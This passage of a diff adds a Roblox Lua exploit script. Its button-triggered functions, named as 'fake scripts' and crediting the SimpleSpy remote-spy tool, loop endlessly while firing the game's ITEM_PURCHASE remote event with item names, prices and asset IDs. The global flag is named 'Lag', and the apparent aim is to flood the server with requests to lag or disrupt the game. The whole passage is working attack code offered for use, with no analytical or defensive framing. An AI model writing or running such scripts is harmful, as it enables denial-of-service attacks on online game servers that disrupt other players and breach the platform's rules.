+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(CMARF_fake_script)()
+local function RQPAPA_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(RQPAPA_fake_script)()
+local function WIPZ_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
